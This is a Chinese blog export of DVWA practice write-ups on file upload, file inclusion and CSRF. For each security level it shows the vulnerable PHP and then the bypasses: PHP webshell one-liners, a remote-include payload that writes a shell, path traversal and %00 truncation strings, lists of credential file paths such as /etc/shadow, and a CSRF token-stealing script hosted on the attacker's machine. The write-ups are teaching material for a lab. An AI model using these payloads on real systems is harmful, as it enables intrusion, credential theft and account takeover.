    <content type="text"><![CDATA[Vulnerability: File UploadIntruduce文件上传漏洞 形成的主因：由于对上传文件类型未验证或过滤机制不严，导致恶意用户可以上传脚本文件，通过上传文件可达到控制网站权限的目的 危害:攻击者可获得网站控制权限,查看、修改、删除网站数据,通过提权漏洞可获得主机权限 上传点：头像、附件、后台新闻编辑等等 利用条件成功上传木马文件 木马文件能够执行 上传路径可知 上传检查方式A 客户端javascript 检测(通常为检测文件扩展名) B 服务端MIME 类型检测(检测Content-Type 内容) C 服务端目录路径检测(检测跟path 参数相关的内容) D 服务端文件扩展名检测(检测跟文件extension 相关的内容) E 服务端文件内容检测(检测内容是否合法或含有恶意代码) 常见上传漏洞对文件类型无任何验证可直接上传相应脚本文件 本地javascript扩展名校验一切在客户端的校验都是伪校验 使用黑名单or白名单扩展名定义方式对比 上传文件未进行重命名结合web应用解析漏洞 客户端可控制上传参数部分敏感上传参数在客户端可控 数据库备份可通过备份功能修改文件后缀 检测绕过检测绕过 停止客户端检测脚本 MIME类型检测绕过 黑名单列表绕过 特殊文件名绕过 利用截断 利用解析漏洞 利用.htaccess文件 可修改上传文件 黑名单检测绕过1. 文件名大小写绕过用AsP，pHp之类的文件名绕过黑名单检测。 2. 名单列表绕过用黑名单里没有的名单进行攻击，比如黑名单里面没有asa或者cer之类。 3. 0x00截断绕过例如：help.asp .jpg(asp后面为0x00)，在判断时，大多函数取后缀名是从后往前取，故能够通过，但是在保存时，却被保存为help.asp。 4. .htaccess文件攻击配合名单列表绕过，上传一个自定义的.htaccess。 Low File Upload Source&lt;?php if( isset( $_POST[ &apos;Upload&apos; ] ) ) { // Where are we going to be writing to? $target_path = DVWA_WEB_PAGE_TO_ROOT . &quot;hackable/uploads/&quot;; $target_path .= basename( $_FILES[ &apos;uploaded&apos; ][ &apos;name&apos; ] ); // Can we move the file to the upload folder? if( !move_uploaded_file( $_FILES[ &apos;uploaded&apos; ][ &apos;tmp_name&apos; ], $target_path ) ) { // No echo &apos;&lt;pre&gt;Your image was not uploaded.&lt;/pre&gt;&apos;; } else { // Yes! echo &quot;&lt;pre&gt;{$target_path} succesfully uploaded!&lt;/pre&gt;&quot;; } } ?&gt; 分析basename() 函数返回路径中的文件名部分。 PHP 的全局数组 $_FILES，你可以从客户计算机向远程服务器上传文件。 第一个参数是表单的 input name，第二个下标可以是 &quot;name&quot;、&quot;type&quot;、&quot;size&quot;、&quot;tmp_name&quot; 或 &quot;error&quot;。如下所示： $_FILES[&quot;file&quot;][&quot;name&quot;] - 上传文件的名称 $_FILES[&quot;file&quot;][&quot;type&quot;] - 上传文件的类型 $_FILES[&quot;file&quot;][&quot;size&quot;] - 上传文件的大小，以字节计 $_FILES[&quot;file&quot;][&quot;tmp_name&quot;] - 存储在服务器的文件的临时副本的名称 $_FILES[&quot;file&quot;][&quot;error&quot;] - 由文件上传导致的错误代码 对于上传的文件没有做任何过滤 漏洞利用直接上传一句话 ../../hackable/uploads/shell_exe.php http://192.168.10.11/dvwa/hackable/uploads/shell_exe.php http://192.168.10.11/dvwa/hackable/uploads/shell_exe.php?cmd=ipconfig 找到路径并利用 传一句话连接菜刀 MiddleFile Upload Source&lt;?php if( isset( $_POST[ &apos;Upload&apos; ] ) ) { // Where are we going to be writing to? $target_path = DVWA_WEB_PAGE_TO_ROOT . &quot;hackable/uploads/&quot;; $target_path .= basename( $_FILES[ &apos;uploaded&apos; ][ &apos;name&apos; ] ); // File information $uploaded_name = $_FILES[ &apos;uploaded&apos; ][ &apos;name&apos; ]; $uploaded_type = $_FILES[ &apos;uploaded&apos; ][ &apos;type&apos; ]; $uploaded_size = $_FILES[ &apos;uploaded&apos; ][ &apos;size&apos; ]; // Is it an image? if( ( $uploaded_type == &quot;image/jpeg&quot; || $uploaded_type == &quot;image/png&quot; ) &amp;&amp; ( $uploaded_size &lt; 100000 ) ) { // Can we move the file to the upload folder? if( !move_uploaded_file( $_FILES[ &apos;uploaded&apos; ][ &apos;tmp_name&apos; ], $target_path ) ) { // No echo &apos;&lt;pre&gt;Your image was not uploaded.&lt;/pre&gt;&apos;; } else { // Yes! echo &quot;&lt;pre&gt;{$target_path} succesfully uploaded!&lt;/pre&gt;&quot;; } } else { // Invalid file echo &apos;&lt;pre&gt;Your image was not uploaded. We can only accept JPEG or PNG images.&lt;/pre&gt;&apos;; } } ?&gt; 分析关键代码部分 ( $uploaded_type == &quot;image/jpeg&quot; || $uploaded_type == &quot;image/png&quot; ) &amp;&amp; ( $uploaded_size &lt; 100000 ) 这里对文件类型了文件大小做了检查，要求Content-Type字段为image/jpeg 或 image/png ，内容的大小小于 100000 漏洞利用抓包后将Content_Type字段改为image/jpeg即可 采用%00截断在php版本小于5.3.4的版本中，当Magic_quote_gpc选项为off时，可以在文件名中使用%00截断，所以可以把上传文件命名a1.php%00.png进行绕过 HighFile Upload Source&lt;?php if( isset( $_POST[ &apos;Upload&apos; ] ) ) { // Where are we going to be writing to? $target_path = DVWA_WEB_PAGE_TO_ROOT . &quot;hackable/uploads/&quot;; $target_path .= basename( $_FILES[ &apos;uploaded&apos; ][ &apos;name&apos; ] ); // File information $uploaded_name = $_FILES[ &apos;uploaded&apos; ][ &apos;name&apos; ]; $uploaded_ext = substr( $uploaded_name, strrpos( $uploaded_name, &apos;.&apos; ) + 1); $uploaded_size = $_FILES[ &apos;uploaded&apos; ][ &apos;size&apos; ]; $uploaded_tmp = $_FILES[ &apos;uploaded&apos; ][ &apos;tmp_name&apos; ]; // Is it an image? if( ( strtolower( $uploaded_ext ) == &quot;jpg&quot; || strtolower( $uploaded_ext ) == &quot;jpeg&quot; || strtolower( $uploaded_ext ) == &quot;png&quot; ) &amp;&amp; ( $uploaded_size &lt; 100000 ) &amp;&amp; getimagesize( $uploaded_tmp ) ) { // Can we move the file to the upload folder? if( !move_uploaded_file( $uploaded_tmp, $target_path ) ) { // No echo &apos;&lt;pre&gt;Your image was not uploaded.&lt;/pre&gt;&apos;; } else { // Yes! echo &quot;&lt;pre&gt;{$target_path} succesfully uploaded!&lt;/pre&gt;&quot;; } } else { // Invalid file echo &apos;&lt;pre&gt;Your image was not uploaded. We can only accept JPEG or PNG images.&lt;/pre&gt;&apos;; } } ?&gt; 分析关键代码分析 $uploaded_ext = substr( $uploaded_name, strrpos( $uploaded_name, &apos;.&apos; ) + 1); strrpos() 函数查找字符串在另一字符串中最后一次出现的位置(对大小写敏感）。 substr(string,start,length) 函数返回字符串的一部分(如果 start 参数是负数且 length 小于或等于 start，则 length 为 0)。 ( strtolower( $uploaded_ext ) == &quot;jpg&quot; || strtolower( $uploaded_ext ) == &quot;jpeg&quot; || strtolower( $uploaded_ext ) == &quot;png&quot; ) &amp;&amp; ( $uploaded_size &lt; 100000 ) &amp;&amp; getimagesize( $uploaded_tmp ) getimagesize(string filename) 函数会通过读取文件头，返回图片的长、宽等信息，如果没有相关的图片文件头，函数会报错。 可以看到先读取文件名中最后一个”.”后的字符串，期望通过文件名来限制文件类型，因此要求上传文件名形式必须是”.jpg”、”.jpeg” 、”*.png”之一。同时，getimagesize函数更是限制了上传文件的文件头必须为图像类型。 漏洞利用直接上传一个图片马 ImpossibleFile Upload Source&lt;?php if( isset( $_POST[ &apos;Upload&apos; ] ) ) { // Check Anti-CSRF token checkToken( $_REQUEST[ &apos;user_token&apos; ], $_SESSION[ &apos;session_token&apos; ], &apos;index.php&apos; ); // File information $uploaded_name = $_FILES[ &apos;uploaded&apos; ][ &apos;name&apos; ]; $uploaded_ext = substr( $uploaded_name, strrpos( $uploaded_name, &apos;.&apos; ) + 1); $uploaded_size = $_FILES[ &apos;uploaded&apos; ][ &apos;size&apos; ]; $uploaded_type = $_FILES[ &apos;uploaded&apos; ][ &apos;type&apos; ]; $uploaded_tmp = $_FILES[ &apos;uploaded&apos; ][ &apos;tmp_name&apos; ]; // Where are we going to be writing to? $target_path = DVWA_WEB_PAGE_TO_ROOT . &apos;hackable/uploads/&apos;; //$target_file = basename( $uploaded_name, &apos;.&apos; . $uploaded_ext ) . &apos;-&apos;; $target_file = md5( uniqid() . $uploaded_name ) . &apos;.&apos; . $uploaded_ext; $temp_file = ( ( ini_get( &apos;upload_tmp_dir&apos; ) == &apos;&apos; ) ? ( sys_get_temp_dir() ) : ( ini_get( &apos;upload_tmp_dir&apos; ) ) ); $temp_file .= DIRECTORY_SEPARATOR . md5( uniqid() . $uploaded_name ) . &apos;.&apos; . $uploaded_ext; // Is it an image? if( ( strtolower( $uploaded_ext ) == &apos;jpg&apos; || strtolower( $uploaded_ext ) == &apos;jpeg&apos; || strtolower( $uploaded_ext ) == &apos;png&apos; ) &amp;&amp; ( $uploaded_size &lt; 100000 ) &amp;&amp; ( $uploaded_type == &apos;image/jpeg&apos; || $uploaded_type == &apos;image/png&apos; ) &amp;&amp; getimagesize( $uploaded_tmp ) ) { // Strip any metadata, by re-encoding image (Note, using php-Imagick is recommended over php-GD) if( $uploaded_type == &apos;image/jpeg&apos; ) { $img = imagecreatefromjpeg( $uploaded_tmp ); imagejpeg( $img, $temp_file, 100); } else { $img = imagecreatefrompng( $uploaded_tmp ); imagepng( $img, $temp_file, 9); } imagedestroy( $img ); // Can we move the file to the web root from the temp folder? if( rename( $temp_file, ( getcwd() . DIRECTORY_SEPARATOR . $target_path . $target_file ) ) ) { // Yes! echo &quot;&lt;pre&gt;&lt;a href=&apos;${target_path}${target_file}&apos;&gt;${target_file}&lt;/a&gt; succesfully uploaded!&lt;/pre&gt;&quot;; } else { // No echo &apos;&lt;pre&gt;Your image was not uploaded.&lt;/pre&gt;&apos;; } // Delete any temp files if( file_exists( $temp_file ) ) unlink( $temp_file ); } else { // Invalid file echo &apos;&lt;pre&gt;Your image was not uploaded. We can only accept JPEG or PNG images.&lt;/pre&gt;&apos;; } } // Generate Anti-CSRF token generateSessionToken(); ?&gt; 分析magecreatefromjpeg ( filename ) 函数返回图片文件的图像标识，失败返回false imagecreatefromjpeg — 由文件或 URL 创建一个新图象。 imagejpeg ( image , filename , quality) 从image图像以filename为文件名创建一个JPEG图像，可选参数quality，范围从 0（最差质量，文件更小）到 100（最佳质量，文件最大）。 imagedestroy( img ) 函数销毁图像资源 可以看到，Impossible级别的代码对上传文件进行了重命名（为md5值，导致%00截断无法绕过过滤规则），加入Anti-CSRF token防护CSRF攻击，同时对文件的内容作了严格的检查，导致攻击者无法上传含有恶意脚本的文件 参考渗透测试方法论之文件上传 DVWA之PHP文件上传漏洞（File Upload）]]></content>
      <tags>
        <tag>practice</tag>
        <tag>XSS</tag>
        <tag>File_Upload</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[DVWA-File_Inclusion]]></title>
    <url>%2F2018%2F07%2F29%2FDVWA-File_Inclusion%2F</url>
    <content type="text"><![CDATA[Vulnerability: File InclusionIntruduceFile Inclusion，意思是文件包含（漏洞）： 产生原因：由于开发人员编写源码时，要将重复使用的代码插入到单个的文件中，并在需要时调用这段代码；而由于并未对代码中存在文件包含的函数入口做过滤，导致客户端可以提交恶意代码到服务器并执行。 文件包含漏洞是“代码注入”的一种，其原理就是注入一段用户能控制的脚本或代码，并让服务端执行。“代码注入”的典型代表就是文件包含，文件包含漏洞可能出现在JSP、PHP、ASP等语言中。 利用条件若要成功利用文件包含漏洞进行攻击，需要满足以下两个条件：Web应用采用include/require()等文件包含函数通过动态变量的方式引入需要包含的文件 用户能够控制该动态变量 本地文件包含（利用前提）1、相关函数内的参数可控 远程文件包含（利用前提）1、相关函数内的参数可控 2、allow_url_fopen = On 当服务器开启allow_url_include选项时，就可以通过php的某些特性函数（include()，require()和include_once()，require_once()）利用url去动态包含文件，此时如果没有对文件来源进行严格审查，就会导致任意文件读取或者任意命令执行。文件包含漏洞分为本地文件包含漏洞与远程文件包含漏洞，远程文件包含漏洞是因为开启了php配置中的allow_url_fopen选项（选项开启之后，服务器允许包含一个远程的文件）。 常见利用方式PHP包含漏洞结合上传漏洞； PHP包含读文件； PHP包含写文件； PHP包含日志文件； PHP截断包含； PHP内置伪协议利用。 Low File Inclusion Source&lt;?php // The page we wish to display $file = $_GET[ &apos;page&apos; ]; ?&gt; 分析服务器端未对page参数做任何过滤和检查 点击 file1.php 漏洞利用1、本地包含、查看敏感信息、绝对路径直接尝试访问 /etc/passwd Xampp的php环境配置文件： Apache：\xampp\apache\conf\httpd.conf PHP：\xampp\php\php.ini MySQL：\xampp\mysql\bin\my.ini phpMyAdmin：\xampp\phpMyAdmin\config.inc.php FileZilla FTP：\xampp\FileZillaFTP\FileZilla Server.xml Mercury Mail：.\xampp\MercuryMail\MERCURY.INI Sendmail：\xampp\sendmail\sendmail.ini 主文件都存放在 htdocs 文件夹中（\xampp\htdocs） 尝试读取php.ini 成功读取，可以看到 magic_quotes_gpc = Off allow_url_fopen on allow_url_include on 配置文件中的Magic_quote_gpc选项为off。在php版本小于5.3.4的服务器中，当Magic_quote_gpc选项为off时，我们可以在文件名中使用%00进行截断，也就是说文件名中%00后的内容不会被识别 &lt;?php include(&quot;inc/&quot; . $_GET[&apos;file&apos;] . &quot;.htm&quot;); ?&gt; %00截断： ?file=../../../../../../../../../etc/passwd%00 (需要 magic_quotes_gpc=off，PHP小于5.3.4有效) %00截断目录遍历： ?file=../../../../../../../../../var/www/%00 (需要 magic_quotes_gpc=off，unix文件系统，比如FreeBSD，OpenBSD，NetBSD，Solaris) 当服务器的php配置中，选项allow_url_fopen与allow_url_include为开启状态时，服务器会允许包含远程服务器上的文件，如果对文件来源没有检查的话，就容易导致任意远程代码执行。 相对路径修改参数 file1.php为一些常见配置文件路径 /dvwa/vulnerabilities/fi/?page=../../../../apache/conf/httpd.conf /dvwa/vulnerabilities/fi/?page=../../../../mysql/bin/my.ini 2、包含Apache日志文件在日志文件中写入phpinfo http://192.168.10.11/dvwa/vulnerabilities/fi/?page=C:/xampp/apache/logs/access.log 写入一句话 &lt;?php @eval($_POST[‘Cknife’]);?&gt; 一开始用的菜刀没连上，一直以为是出了啥问题，换了把菜刀连上了 3、远程文件包含远程代码执行： ?file=[http|https|ftp]://example.com/shell.txt (需要allow_url_fopen=On并且 allow_url_include=On) 首先在我们自己的主机上制作一个包含写入一句话的txt文本 &lt;?php fputs(fopen(&quot;shell.php&quot;,&quot;w&quot;), &quot;&lt;?php eval(\$_POST[111]);?&gt;&quot;);?&gt; 在远程包含我们构造好的test.txt文本，通过该文本在目标主机上写入一句话菜刀连接 4、配合上传漏洞写webshell和文件上传漏洞或者SQL注入漏洞等一同利用，通过利用前面的漏洞将一句话木马shell.php文件上传到Web服务器中，然后再通过文件包含漏洞包含出现从而得到shell 5、使用PHP封装协议读取文件和写入PHP文件####### 1、读取文件：先看看读取文件，如输入page参数值为： php://filter/read=convert.base64-encode/resource=../../../../mysql/bin/my.ini 2、写入文件：利用php流input： ?file=php://input (需要allow_url_include=On) MiddleFile Inclusion Source&lt;?php // The page we wish to display $file = $_GET[ &apos;page&apos; ]; // Input validation $file = str_replace( array( &quot;http://&quot;, &quot;https://&quot; ), &quot;&quot;, $file ); $file = str_replace( array( &quot;../&quot;, &quot;..\&quot;&quot; ), &quot;&quot;, $file ); ?&gt; 分析使用str_replace函数是极其不安全的，因为可以使用双写叠加绕过替换规则。 将输入的url参数中包含的“http://”、“https://”、“../”、“..\”字符串替换成空的字符串，即过滤了远程文件包含和相对路径，对于本地文件绝对路径包含并没有任何过滤；对于这个替换函数我们可以使用嵌套叠加来绕过 漏洞利用使用嵌套叠加绕过绝对路径过滤../../../../apache/conf/httpd.conf 我们构造如下嵌套的路径就可以绕过了 ..././..././..././..././apache/conf/httpd.conf 使用嵌套叠加绕过远程文件包含过滤 HighFile Inclusion Source&lt;?php // The page we wish to display $file = $_GET[ &apos;page&apos; ]; // Input validation if( !fnmatch( &quot;file*&quot;, $file ) &amp;&amp; $file != &quot;include.php&quot; ) { // This isn&apos;t the page we want! echo &quot;ERROR: File not found!&quot;; exit; } ?&gt; 分析nmatch() 函数根据指定的模式来匹配文件名或字符串。 此函数对于文件名尤其有用，但也可以用于普通的字符串。普通用户可能习惯于 shell 模式或者至少其中最简单的形式 ‘?’ 和 ‘*’ 通配符，因此使用 fnmatch() 来代替 ereg() 或者 preg_match() 来进行前端搜索表达式输入对于非程序员用户更加方便 该函数将只匹配file开头和名为include.php的文件，本质就是利用白名单机制进行过滤，不过也不完全是白名单，其他文件一律报错，看似不能绕过，但是我们可以利用file协议绕过防护策略。 漏洞利用file协议绕过 ImpossibleFile Inclusion Source&lt;?php // The page we wish to display $file = $_GET[ &apos;page&apos; ]; // Only allow include.php or file{1..3}.php if( $file != &quot;include.php&quot; &amp;&amp; $file != &quot;file1.php&quot; &amp;&amp; $file != &quot;file2.php&quot; &amp;&amp; $file != &quot;file3.php&quot; ) { // This isn&apos;t the page we want! echo &quot;ERROR: File not found!&quot;; exit; } ?&gt; 分析使用了白名单进行检查是否为可信的文件，暂无利用方法 系统常见的敏感信息路径：Windows系统C:\boot.ini //查看系统版本 C:\Windows\System32\inetsrv\Metabase.xml //IIS配置文件 C:\Windows\repair\sam //存储Windows系统初次安装的密码 C:\Programe Files\mysql\my.ini //Mysql配置 C:\Programe Files\mysql\data\mysql\use.MYD //Mysql root C:\Windows\php.ini //php 配置信息 C:\Windows\mysql.ini // Mysql配置文件 C:\mysql\data\mysql\user.MYD //存储了mysql.user表中的数据库连接密码 C:\Program Files\RhinoSoft.com\Serv-U\ServUDaemon.ini //存储了虚拟主机网站路径和密码 C:\Program Files\Serv-U\ServUDaemon.ini Linux系统/etc/passwd //用户信息文件 /etc/shadow //密码 /usr/local/app/apache2/conf/httpd.conf //apache2默认设置文件 /usr/local/app/apache2/conf/extra/httpd-vhosts.conf //虚拟主机设置 /usr/local/app/php5/lib/php.ini //PHP相关设置 /etc/httpd/conf/httpd.conf //apache配置文件 /etc/my.cnf //Mysql的配置文件 /etc/sysconfig/iptables //从中得到防火墙规则策略 /etc/rsyncd.conf //同步程序配置文件 /etc/sysconfig/network-scripts/ifcfg-eth0 //查看IP. /etc/redhat-release //系统版本 /etc/issue /etc/issue.net 检测方法1、找到有包含函数的页面，对函数内容进行替换查看结果； 注意path参数，一般可能的变量名： src、 filename、 file、 path、filepath、uri…… 2、可以使用工具来代替手工的过程，如Kadimus、Burpsuite的插件LFI scanner checks等； 3、白盒测试时，可以在源代码中查看allow_url_fopen、allow_url_include等敏感函数是否开启。 文件包含防护代码层1.严格判断包含的参数是否外部可控，因为文件包含漏洞利用成功与否的关键点就在于被包含的文件是否可被外部控制； 2.路径限制：限制被包含的文件只能在某一文件夹内，一定要禁止目录跳转字符，如：“../”； 3.包含文件验证：验证被包含的文件是否是白名单中的一员； 4.尽量不要使用动态包含，可以在需要包含的页面固定写好，如：include(&quot;head.php&quot;);。 5.尽量不使用远程文件包含，如果业务无法避免，尽量校验远程主机域名。 使用白名单指定能包含的文件 &lt;?php $filename = $_GET[&apos;filename&apos;]; switch($filename){ case &apos;head&apos;; case &apos;foot&apos;; case &apos;main&apos;; include &apos;var/www/html/&apos;.$filename.&apos;php&apos;; break; default: include &apos;/var/www/html/main.php&apos;; } ?&gt; 设置open_basedir的值将允许包含的文件限定在某一特定目录内。 注：open_basedir是目录前缀open_basedir=/var/www/testopen_basedir=/var/www/test/ 第一种情况可以允许/var/www/test 、 /var/www/test123 等目录如果要严格限制目录应使用第二种 参考新手指南：DVWA-1.9全级别教程之File Inclusion DVWA之PHP文件包含漏洞（File Inclusion） 本地文件包含漏洞&amp;&amp;PHP利用协议&amp;&amp;实践源码 php文件包含漏洞]]></content>
      <tags>
        <tag>DVWA</tag>
        <tag>practice</tag>
        <tag>File_Inclusion</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[DVWA-CSRF]]></title>
    <url>%2F2018%2F07%2F26%2FDVWA-CSRF%2F</url>
    <content type="text"><![CDATA[IntroductionCSRF（Cross-site request forgery）跨站请求伪造: 主要利用受害者尚未失效的身份认证信息（cookie、会话等），诱骗其点击恶意链接或者访问包含攻击代码的页面，在受害人不知情的情况下以受害者的身份向（身份认证信息所对应的）服务器发送请求，从而完成非法操作（如转账、改密等）。 跨站脚本（XSS）与跨站请求伪造(CSRF)区别XSS利用站点内的信任用户，而CSRF则通过伪装来自受信任用户的请求来利用受信任的网站。CSRF与XSS最大的区别就在于，CSRF并没有盗取cookie而是直接利用。 Low 服务端源代码&lt;?php if( isset( $_GET[ &apos;Change&apos; ] ) ) { // Get input $pass_new = $_GET[ &apos;password_new&apos; ]; $pass_conf = $_GET[ &apos;password_conf&apos; ]; // Do the passwords match? if( $pass_new == $pass_conf ) { // They do! $pass_new = ((isset($GLOBALS[&quot;___mysqli_ston&quot;]) &amp;&amp; is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;], $pass_new ) : ((trigger_error(&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;, E_USER_ERROR)) ? &quot;&quot; : &quot;&quot;)); $pass_new = md5( $pass_new ); // Update the database $insert = &quot;UPDATE `users` SET password = &apos;$pass_new&apos; WHERE user = &apos;&quot; . dvwaCurrentUser() . &quot;&apos;;&quot;; $result = mysqli_query($GLOBALS[&quot;___mysqli_ston&quot;], $insert ) or die( &apos;&lt;pre&gt;&apos; . ((is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_error($GLOBALS[&quot;___mysqli_ston&quot;]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . &apos;&lt;/pre&gt;&apos; ); // Feedback for the user echo &quot;&lt;pre&gt;Password Changed.&lt;/pre&gt;&quot;; } else { // Issue with passwords matching echo &quot;&lt;pre&gt;Passwords did not match.&lt;/pre&gt;&quot;; } ((is_null($___mysqli_res = mysqli_close($GLOBALS[&quot;___mysqli_ston&quot;]))) ? false : $___mysqli_res); } ?&gt; 分析1、判断是否设置了Change变量 2、新设置的密码与确认密码是否相同 3、相同则将新密码做md5然后做update 4、可以看到并没有验证新旧密码相同，没有任何的防CSRF机制（当然服务器对请求的发送者是做了身份验证的，是检查的cookie，只是这里的代码没有体现） 漏洞利用1、观察请求方式 /dvwa/vulnerabilities/csrf/?password_new=test1&amp;password_conf=test1&amp;Change=Change 2、构造url更改点击点击链接受害者的密码 /dvwa/vulnerabilities/csrf/?password_new=yourpasswd&amp;password_conf=yourpasswd&amp;Change=Change 当受害人刚刚登入访问了该站点，session没有失效，点击了这个链接后他的密码就会变成我们构造好的密码，为了增加隐蔽性可以将url换成短url，更高级的可以制作一个攻击的页面，让受害者访问，不知不觉完成攻击（注意使用相同的浏览器） Middle服务端源代码CSRF Source &lt;?php if( isset( $_GET[ &apos;Change&apos; ] ) ) { // Checks to see where the request came from if( stripos( $_SERVER[ &apos;HTTP_REFERER&apos; ] ,$_SERVER[ &apos;SERVER_NAME&apos; ]) !== false ) { // Get input $pass_new = $_GET[ &apos;password_new&apos; ]; $pass_conf = $_GET[ &apos;password_conf&apos; ]; // Do the passwords match? if( $pass_new == $pass_conf ) { // They do! $pass_new = ((isset($GLOBALS[&quot;___mysqli_ston&quot;]) &amp;&amp; is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;], $pass_new ) : ((trigger_error(&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;, E_USER_ERROR)) ? &quot;&quot; : &quot;&quot;)); $pass_new = md5( $pass_new ); // Update the database $insert = &quot;UPDATE `users` SET password = &apos;$pass_new&apos; WHERE user = &apos;&quot; . dvwaCurrentUser() . &quot;&apos;;&quot;; $result = mysqli_query($GLOBALS[&quot;___mysqli_ston&quot;], $insert ) or die( &apos;&lt;pre&gt;&apos; . ((is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_error($GLOBALS[&quot;___mysqli_ston&quot;]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . &apos;&lt;/pre&gt;&apos; ); // Feedback for the user echo &quot;&lt;pre&gt;Password Changed.&lt;/pre&gt;&quot;; } else { // Issue with passwords matching echo &quot;&lt;pre&gt;Passwords did not match.&lt;/pre&gt;&quot;; } } else { // Didn&apos;t come from a trusted source echo &quot;&lt;pre&gt;That request didn&apos;t look correct.&lt;/pre&gt;&quot;; } ((is_null($___mysqli_res = mysqli_close($GLOBALS[&quot;___mysqli_ston&quot;]))) ? false : $___mysqli_res); } ?&gt; 分析与之前相比，这里检查了是否同源 if( stripos( $_SERVER[ ‘HTTP_REFERER’ ] ,$_SERVER[ ‘SERVER_NAME’ ]) int eregi(string pattern, string string) 检查string中是否含有pattern（不区分大小写），如果有返回True，反之False。 可以看到，Medium级别的代码检查了保留变量 HTTP_REFERER（http包头的Referer参数的值，表示来源地址）中是否包含SERVER_NAME（http包头的Host参数，及要访问的主机名，这里是192.168.xx.xx），希望通过这种机制抵御CSRF攻击。 漏洞利用过滤规则是http包头的Referer参数的值中必须包含主机名（这里是192.168.xx.xx）我们可以将攻击页面命名为192.168.10.11.html（页面被放置在攻击者的服务器里，这里是192.168.10.10）就可以绕过了 &lt;img src=&quot;http://192.168.10.11/dvwa/pvulnerabilities/csrf/?password_new=hack&amp;password_conf=hack&amp;Change=Change#&quot; border=&quot;0&quot; style=&quot;display:none;&quot;/&gt; &lt;h1&gt;404&lt;h1&gt; &lt;h2&gt;file not found.&lt;h2&gt; 抓包后在Repeater中修改HTTP数据包中的Referer参数为 http://192.168.10.10/admin/test_csrf_192.168.10.11.html High服务端源代码&lt;?php if( isset( $_GET[ &apos;Change&apos; ] ) ) { // Check Anti-CSRF token checkToken( $_REQUEST[ &apos;user_token&apos; ], $_SESSION[ &apos;session_token&apos; ], &apos;index.php&apos; ); // Get input $pass_new = $_GET[ &apos;password_new&apos; ]; $pass_conf = $_GET[ &apos;password_conf&apos; ]; // Do the passwords match? if( $pass_new == $pass_conf ) { // They do! $pass_new = ((isset($GLOBALS[&quot;___mysqli_ston&quot;]) &amp;&amp; is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;], $pass_new ) : ((trigger_error(&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;, E_USER_ERROR)) ? &quot;&quot; : &quot;&quot;)); $pass_new = md5( $pass_new ); // Update the database $insert = &quot;UPDATE `users` SET password = &apos;$pass_new&apos; WHERE user = &apos;&quot; . dvwaCurrentUser() . &quot;&apos;;&quot;; $result = mysqli_query($GLOBALS[&quot;___mysqli_ston&quot;], $insert ) or die( &apos;&lt;pre&gt;&apos; . ((is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_error($GLOBALS[&quot;___mysqli_ston&quot;]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . &apos;&lt;/pre&gt;&apos; ); // Feedback for the user echo &quot;&lt;pre&gt;Password Changed.&lt;/pre&gt;&quot;; } else { // Issue with passwords matching echo &quot;&lt;pre&gt;Passwords did not match.&lt;/pre&gt;&quot;; } ((is_null($___mysqli_res = mysqli_close($GLOBALS[&quot;___mysqli_ston&quot;]))) ? false : $___mysqli_res); } // Generate Anti-CSRF token generateSessionToken(); ?&gt; 分析关键代码 // Check Anti-CSRF token checkToken( $_REQUEST[ &apos;user_token&apos; ], $_SESSION[ &apos;session_token&apos; ], &apos;index.php&apos; ); // Generate Anti-CSRF token generateSessionToken(); High级别的带入引入了Anti-CSRF token,用户每次访问改密页面时，服务器会通过generateSessionToken()返回一个随机的token，向服务器发起请求时，需要提交token参数，而服务器在收到请求时，会优先检查token，只有客户端提交的token参数与服务器端一致时，服务器端才会处理客户端的响应。 漏洞利用要绕过High Security Level的反CSRF机制，关键是要获取token，要利用受害者的cookie去修改密码的页面获取关键的token。 1、试着去构造一个攻击页面，将其放置在攻击者的服务器，引诱受害者访问，从而完成CSRF攻击，下面是代码。 xss.js alert(document.cookie); var theUrl = &apos;http://192.168.10.11/dvwa/vulnerabilities/csrf/&apos;; if(window.XMLHttpRequest) { xmlhttp = new XMLHttpRequest(); }else{ xmlhttp = new ActiveXObject(&quot;Microsoft.XMLHTTP&quot;); } var count = 0; xmlhttp.withCredentials = true; xmlhttp.onreadystatechange=function(){ if(xmlhttp.readyState ==4 &amp;&amp; xmlhttp.status==200) { var text = xmlhttp.responseText; var regex = /user_token\&apos; value\=\&apos;(.*?)\&apos; \/\&gt;/; var match = text.match(regex); console.log(match); alert(match[1]); var token = match[1]; var new_url = &apos;http://192.168.10.11/dvwa/vulnerabilities/csrf/?user_token=&apos;+token+&apos;&amp;password_new=test&amp;password_conf=test&amp;Change=Change&apos;; if(count==0){ count++; xmlhttp.open(&quot;GET&quot;,new_url,false); xmlhttp.send(); } } }; xmlhttp.open(&quot;GET&quot;,theUrl,false); xmlhttp.send(); xss.js放置于攻击者的网站上：http://192.168.10.10/admin/xss.js 2、DOM XSS与CSRF结合： CSRF结合同Security Level的DOM XSS，通过ajax实现跨域请求来获取用户的user_token，用以下链接来让受害者访问： http://192.168.10.11/dvwa/vulnerabilities/xss_d/?default=English#%3Cscript%20src=%22http://192.168.10.10/admin/xss.js%22%3E%3C/script%3E 成功修改密码为test Impossible 服务端源代码&lt;?php if( isset( $_GET[ &apos;Change&apos; ] ) ) { // Check Anti-CSRF token checkToken( $_REQUEST[ &apos;user_token&apos; ], $_SESSION[ &apos;session_token&apos; ], &apos;index.php&apos; ); // Get input $pass_curr = $_GET[ &apos;password_current&apos; ]; $pass_new = $_GET[ &apos;password_new&apos; ]; $pass_conf = $_GET[ &apos;password_conf&apos; ]; // Sanitise current password input $pass_curr = stripslashes( $pass_curr ); $pass_curr = ((isset($GLOBALS[&quot;___mysqli_ston&quot;]) 